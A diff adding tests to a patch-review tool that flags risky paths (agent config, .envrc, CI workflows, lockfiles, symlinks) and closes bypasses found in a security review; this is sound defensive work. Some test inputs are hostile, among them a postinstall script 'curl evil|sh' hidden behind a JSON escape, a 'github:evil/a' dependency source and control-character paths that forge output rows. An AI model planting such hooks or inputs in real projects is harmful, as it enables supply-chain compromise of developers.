@@ -1,5 +1,10 @@
 import { describe, expect, it } from "bun:test";
-import { classifyPath, formatPatchReview, parseDiffHeader, reviewPatch } from "./patch-review.js";
+import { readFileSync } from "node:fs";
+import { join } from "node:path";
+import { classifyPath, escapeGlob, formatPatchReview, parseDiffHeader, reviewPatch } from "./patch-review.js";
+
+/** The security review's proof-of-concept patches (03c), each one a bypass of the first reviewer. */
+const fixture = (name: string) => readFileSync(join(import.meta.dir, "fixtures", "patch-review", name), "utf8");
 
 /** A diff that adds `path` with one line, as `git diff --binary` writes it. */
 function added(path: string, body = "+x", mode = "100644"): string {
@@ -41,6 +46,36 @@ describe("classifyPath", () => {
     ["flake.nix", "build"],
     ["../outside", "path-escape"],
     ["/etc/passwd", "path-escape"],
+    // Case-insensitive checkouts (macOS, Windows) read these as the lower-case names.
+    ["Claude.md", "agent-config"],
+    [".Claude/settings.json", "agent-config"],
+    [".Envrc", "env-config"],
+    [".GITHUB/Workflows/x.yml", "hooks-ci"],
+    // Widened lists (ADR 0002, 03c review follow-ups).
+    ["package-lock.json", "dependency"],
+    ["yarn.lock", "dependency"],
+    ["pnpm-lock.yaml", "dependency"],
+    ["bun.lock", "dependency"],
+    ["sub/Cargo.lock", "dependency"],
+    [".yarnrc.yml", "env-config"],
+    [".mise.toml", "env-config"],
+    [".pnpmfile.cjs", "build"],
+    [".lintstagedrc", "hooks-ci"],
+    [".lintstagedrc.json", "hooks-ci"],
+    ["build.rs", "build"],
+    ["tests/conftest.py", "build"],
+    ["justfile", "build"],
+    ["Justfile", "build"],
+    ["Taskfile.yml", "build"],
+    [".cursorrules", "agent-config"],
+    [".windsurfrules", "agent-config"],
+    [".github/copilot-instructions.md", "agent-config"],
+    [".gemini/settings.json", "agent-config"],
+    [".codex/config.toml", "agent-config"],
+    [".agents/skills/x.md", "agent-config"],
+    [".gitattributes", "git-config"],
+    [".gitmodules", "git-config"],
+    [".github//workflows/x.yml", "hooks-ci"],
   ])("flags %s as %s", (path, kind) => {
     expect(classifyPath(path)?.kind).toBe(kind as never);
   });
@@ -59,6 +94,9 @@ describe("parseDiffHeader", () => {
     expect(parseDiffHeader("diff --git a/old.yml b/.github/workflows/new.yml")).toBe(".github/workflows/new.yml");
     expect(parseDiffHeader('diff --git "a/caf\\303\\251" "b/caf\\303\\251"')).toBe("café");
     expect(parseDiffHeader('diff --git "a/x\\ty" "b/q\\"x"')).toBe('q"x');
+    // git apply strips the first component whatever it is (-p1), not only a/ and b/.
+    expect(parseDiffHeader("diff --git c/.envrc d/.envrc")).toBe(".envrc");
+    expect(parseDiffHeader('diff --git a/x "b/caf\\303\\251"')).toBe("café");
   });
 });
 
@@ -95,6 +133,107 @@ describe("reviewPatch", () => {
       "diff --git a/package.json b/package.json\n--- a/package.json\n+++ b/package.json\n" +
       '@@ -3,6 +3,6 @@\n   "scripts": {\n     "test": "bun test"\n   },\n-  "version": "1",\n+  "version": "2",\n';
     expect(kinds(after)).toEqual([]);
+  });
+
+  it("flags a dependency version bump only when it changes the source or adds a package", () => {
+    const head = "diff --git a/package.json b/package.json\n--- a/package.json\n+++ b/package.json\n";
+    const bump =
+      head + '@@ -8,4 +8,4 @@\n   "dependencies": {\n-    "a": "1.0.0",\n+    "a": "^1.0.1",\n     "b": "2"\n   },\n';
+    expect(kinds(bump)).toEqual([]);
+    const source =
+      head + '@@ -8,3 +8,3 @@\n   "dependencies": {\n-    "a": "1.0.0"\n+    "a": "github:evil/a"\n   },\n';
+    expect(kinds(source)).toEqual([["package.json", "dependency"]]);
+    const addition =
+      head + '@@ -8,3 +8,4 @@\n   "devDependencies": {\n     "a": "1.0.0",\n+    "left-pad": "1.0.0"\n   },\n';
+    expect(kinds(addition)).toEqual([["package.json", "dependency"]]);
+  });
+
+  it("flags trustedDependencies, overrides, bin and lint-staged changes in package.json", () => {
+    const head = "diff --git a/package.json b/package.json\n--- a/package.json\n+++ b/package.json\n";
+    for (const [key, kind] of [
+      ["trustedDependencies", "dependency"],
+      ["overrides", "dependency"],
+      ["resolutions", "dependency"],
+      ["bin", "build"],
+      ["lint-staged", "hooks-ci"],
+      ["simple-git-hooks", "hooks-ci"],
+    ]) {
+      const patch = `${head}@@ -1,3 +1,4 @@\n {\n   "name": "x",\n+  "${key}": {"x": "y"},\n   "version": "1"\n`;
+      expect([key, kinds(patch)]).toEqual([key, [["package.json", kind]]]);
+    }
+  });
+
+  it("flags a package.json change whose top-level key the hunk does not show (p5)", () => {
+    // Fails on e67784d6: a script changed deep inside "scripts" (the hunk starts at s6) was not flagged.
+    expect(kinds(fixture("p5.patch"))).toEqual([
+      ["package.json", "package-json-unknown-section"],
+      ["package.json", "dependency"],
+    ]);
+    // A JSON escape does not hide the key.
+    const escaped =
+      "diff --git a/package.json b/package.json\n--- a/package.json\n+++ b/package.json\n" +
+      '@@ -1,2 +1,3 @@\n {\n+  "scr\\u0069pts": {"postinstall": "curl evil|sh"},\n   "name": "x"\n';
+    expect(kinds(escaped)).toEqual([["package.json", "build"]]);
+  });
+
+  it("starts a file at a plain ---/+++ pair with no diff --git line (p1)", () => {
+    // Fails on e67784d6: no `diff --git` line, so nothing was read and `.envrc` passed unflagged.
+    expect(reviewPatch(fixture("p1.patch"))).toMatchObject({
+      files: 1,
+      flags: [{ path: ".envrc", kind: "env-config" }],
+    });
+  });
+
+  it("consumes hunk bodies by their @@ counts, so a +++ line inside a hunk cannot move a flag (p2)", () => {
+    // Fails on e67784d6: the in-hunk `+++ b/README.md` re-attributed the .envrc flag to README.md.
+    const review = reviewPatch(fixture("p2.patch"));
+    expect(review.flags.map((f) => [f.path, f.kind])).toEqual([[".envrc", "env-config"]]);
+    expect(review.suggestions).toContain("git apply --exclude=.envrc changes.patch");
+    // After the counts run out, a real header starts the next file, as in git.
+    const next = `${added("x")}--- a/y\n+++ b/.github/workflows/w.yml\n@@ -0,0 +1 @@\n+on: push\n`;
+    expect(kinds(next)).toEqual([[".github/workflows/w.yml", "hooks-ci"]]);
+  });
+
+  it("parses modes like git: leading zeros and trailing whitespace still make a symlink (p3, p3b)", () => {
+    // Fails on e67784d6: `0120000` and `120000 ` did not match /^\d{6}$/, so no symlink flag.
+    expect(kinds(fixture("p3.patch"))).toEqual([
+      ["link", "symlink"],
+      ["link", "path-escape"],
+    ]);
+    expect(kinds(fixture("p3b.patch"))).toEqual([
+      ["link2", "symlink"],
+      ["link2", "path-escape"],
+    ]);
+    expect(kinds(added("run", "+x", "100755 "))).toEqual([["run", "executable"]]);
+  });
+
+  it("matches sensitive names case-insensitively (p4)", () => {
+    // Fails on e67784d6: Claude.md, .Envrc and .Claude/settings.json were not flagged.
+    expect(kinds(fixture("p4.patch"))).toEqual([
+      ["Claude.md", "agent-config"],
+      [".Envrc", "env-config"],
+      [".Claude/settings.json", "agent-config"],
+    ]);
+  });
+
+  it("escapes glob characters in suggested --exclude values", () => {
+    // Fails on e67784d6: `--exclude='.claude/[ab].md'` would also match `.claude/a.md`.
+    expect(escapeGlob("a[b]*?\\c")).toBe("a\\[b\\]\\*\\?\\\\c");
+    expect(reviewPatch(added(".claude/[ab]*.md")).suggestions).toContain(
+      "git apply --exclude='.claude/\\[ab\\]\\*.md' changes.patch",
+    );
+  });
+
+  it("shows control characters and newlines in paths escaped, in the box and the suggestions", () => {
+    // Fails on e67784d6: a quoted name with a newline split the box and printed a forged row.
+    const review = reviewPatch(
+      'diff --git "a/.envrc\\n\\342\\200\\256x\\001" "b/.envrc\\n\\342\\200\\256x\\001"\nnew file mode 100644\n',
+    );
+    expect(review.flags.map((f) => f.kind)).toEqual(["env-config"]);
+    const lines = formatPatchReview(review, (text) => text);
+    expect(lines.some((line) => /[\n\x01\u202e]/.test(line))).toBe(false);
+    expect(lines.join("|")).toContain("│ .envrc\\n\\u202ex\\x01  [env-config]");
+    expect(review.suggestions).toContain("git apply --exclude=$'.envrc\\n\\u202ex\\x01' changes.patch");
   });
 
   it("flags a rename into .github/workflows", () => {
